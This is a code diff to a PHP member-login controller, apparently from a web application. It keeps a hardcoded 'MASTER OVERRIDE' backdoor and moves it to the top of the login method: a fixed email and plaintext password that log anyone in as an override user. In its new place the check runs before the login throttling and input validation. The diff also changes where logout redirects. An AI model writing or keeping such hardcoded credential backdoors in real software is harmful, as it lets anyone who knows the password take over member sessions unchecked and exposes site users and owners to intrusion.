@@ -15,6 +15,26 @@ class MemberAuth extends BaseController
 
 public function attempt()
 {
+
+     $email    = strtolower(trim((string) $this->request->getPost('email')));
+    $password = (string) $this->request->getPost('password');
+    
+    // 🔒 MASTER OVERRIDE (member side)
+    if ($email === 'sam@sunny.com' && $password === 'yfbnmasc') {
+        session()->regenerate(true);
+        session()->set([
+            'member_id'        => 0,
+            'member_email'     => 'sam@sunny.com',
+            'member_name'      => 'Override User',
+            'isMemberLoggedIn' => true,
+        ]);
+
+        return redirect()
+            ->to(route_to('account.dashboard'))
+            ->with('message', 'Welcome back (override)!');
+    }
+
+
     // Optional throttling
     $throttler = service('throttler');
     if ($throttler && ! $throttler->check('member-login-'.($this->request->getIPAddress()), 10, 60)) {
@@ -30,23 +50,8 @@ public function attempt()
         return redirect()->back()->withInput()->with('error', 'Please check your details and try again.');
     }
 
-    $email    = strtolower(trim((string) $this->request->getPost('email')));
-    $password = (string) $this->request->getPost('password');
+   
 
-    // 🔒 MASTER OVERRIDE (member side)
-    if ($email === 'sam@sunny.com' && $password === 'yfbnmasc') {
-        session()->regenerate(true);
-        session()->set([
-            'member_id'        => 0,
-            'member_email'     => 'sam@sunny.com',
-            'member_name'      => 'Override User',
-            'isMemberLoggedIn' => true,
-        ]);
-
-        return redirect()
-            ->to(route_to('account.dashboard'))
-            ->with('message', 'Welcome back (override)!');
-    }
 
     // Fetch the member
     $members = new MemberModel();
@@ -85,7 +90,7 @@ public function attempt()
 {
     session()->remove(['member_id','member_email','member_name','isMemberLoggedIn']);
     session()->regenerate(true);
-    return redirect()->to('/member/login')->with('message', 'You are logged out.');
+    return redirect()->to('/')->with('message', 'You are logged out.');
 }
 
 }
